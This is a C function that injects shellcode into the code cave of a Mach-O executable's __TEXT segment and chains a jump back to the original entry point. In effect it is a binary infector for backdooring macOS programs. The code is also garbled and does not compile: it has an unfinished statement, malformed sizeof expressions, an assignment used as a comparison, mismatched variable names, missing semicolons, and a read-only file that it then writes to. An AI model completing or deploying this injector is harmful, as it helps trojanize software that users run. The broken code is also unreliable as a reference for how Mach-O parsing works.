int binject_MACH-O(char *file,char *shellcode)
{
   
   uint32_t size,oryginal_entry;
   FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
   size=ftell(f);
	int sclen=strlen(shellcode);
   char *file_buffer = calloc(1,size);
  fread(file_buffer,1,size,f);
	struct mach_header *header= (struct mach_header*)file_buffer;
	oryginal_entry
	char *address=file_buffer;
	if(header->magic==MH_MAGIC_64)
	{
		
	        address+=sizeof(struct(mach_header_64);
	}
	if(header->magic=MH_MAGIC)
	{
					address+=sizeof(struct(mach_header);
	}
							
	else
	{
		return -1;
	}
	
for(uint32_t a=0;a<header->ncmds;a++)
 {
					load_command *cmd=(struct load_command*)address;
     if(loadCommand->cmd== LC_MAIN)
     {
	   struct entry_point_command *entryCommand = (struct entry_point_command*)address;
		oryginal_entry=entryCommand->entryOff;     
      }
     if (loadCommand->cmd == LC_SEGMENT)
        {
            struct segment_command *segmentCommand = (struct segment_command*)address;
            if (strncmp(segmentCommand->segname, "__TEXT", 16) == 0)
            {
                uint32_t *sectionAddress = address + sizeof(struct segment_command);
                struct section *sectionCommand = NULL; 
                for (uint32_t c = 0; c < segmentCommand->nsects; c++)
                {
			struct section *sectionCommand = (struct section*)(sectionAddress);
                    if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                    {
                       uint32_t caveOffset += 0x20;
	              caveOffset += header->sizeofcmds;
			uint32_t    cavelen= sectionCommand->offset-caveOffset;
			    sclen+=5;
			if(sclen<cavelen)
			{
				char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,uint32_t entry_point,0) 
				memcpy(file_buffer+cave_offset,shellcodefixed,sclen);
				 fwrite(file_buffer,1,size,f);
				 free(shellcodefixed);
				 free(file_buffer);
				 fclose(f);
			break;
		        }    
                    }
                    sectionAddress += sizeof(struct section);
                }
	
            }
        }
			       
    if (loadCommand->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *segmentCommand64 = (struct segment_command_64*)address;
            if (strncmp(segmentCommand64->segname, "__TEXT", 16) == 0)
            {
                uint32_t *sectionAddress = address + sizeof(struct segment_command_64);
               
                for (uint32_t x = 0; x < segmentCommand64->nsects; x++)
                {
                     struct section_64 sectionCommand64 = (struct section_64*)(sectionAddress);
                    if (strncmp(sectionCommand64->sectname, "__text", 16) == 0)
                    {
                       uint32_t caveOffset += 0x20;
	              caveOffset += header->sizeofcmds;
			uint32_t    cavelen= sectionCommand->offset-caveOffset;
			if(scfixedlen<cavelen)
			{
				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
				 fwrite(buf,1,size,f);
				 free(shellcodefixed);
				 free(file_buffer);
				 fclose(f);
				 return 0;
		        }    
                    }
                    sectionAddress += sizeof(struct section_64);
                }
            }
	}
				       address+=cmd->cmdsize;
 } 

free(shellcodefixed);
free(file_buffer);
fclose(f);
return -1;				       
}
